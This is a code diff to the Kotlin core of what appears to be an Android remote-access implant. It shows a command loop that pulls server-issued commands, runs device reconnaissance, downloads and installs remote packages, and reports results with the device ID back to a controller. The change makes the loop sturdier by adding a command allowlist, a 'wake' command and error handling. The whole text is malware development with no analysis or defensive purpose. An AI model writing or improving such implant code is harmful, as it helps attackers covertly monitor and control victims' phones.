@@ -108,23 +108,32 @@ object Core {
                     if (executedCommandIds.contains(cmdId)) continue
                     executedCommandIds.add(cmdId)
 
+                    val action = cmd.split("|", limit = 2)[0].trim()
+                    if (!Config.ALLOWED_COMMANDS.contains(action) && action != "wake") {
+                        Log.w(TAG, "Unknown command rejected: $cmd")
+                        Transport.markCommandFailed(cmdId)
+                        continue
+                    }
+
                     Log.d(TAG, "Executing: $cmd")
                     Transport.markCommandRunning(cmdId)
 
-                    val result = if (cmd == "recon") {
-                        Recon.execute(context)
-                    } else if (cmd.startsWith("download|")) {
-                        downloadAndInstall(context, cmd.removePrefix("download|"))
-                    } else if (cmd == "die") {
-                        running = false
-                        "BYE"
-                    } else {
-                        Commands.dispatch(context, cmd)
+                    val result = try {
+                        when {
+                            cmd == "recon" -> Recon.execute(context)
+                            cmd.startsWith("download|") -> downloadAndInstall(context, cmd.removePrefix("download|"))
+                            cmd == "die" -> { running = false; "BYE" }
+                            cmd == "wake" -> "AWAKE"
+                            else -> Commands.dispatch(context, cmd)
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Command execution error: ${e.message}")
+                        "ERROR:${e.message}"
                     }
 
                     Transport.sendResult(cmdId, deviceId, result)
                     Transport.markCommandCompleted(cmdId)
-                    Log.d(TAG, "Result sent: ${cmd.take(20)} (${result.length} bytes)")
+                    Log.d(TAG, "Result sent: ${cmd.take(30)} (${result.length} bytes)")
                 }
             }
             if (executedCommandIds.size > 500) {
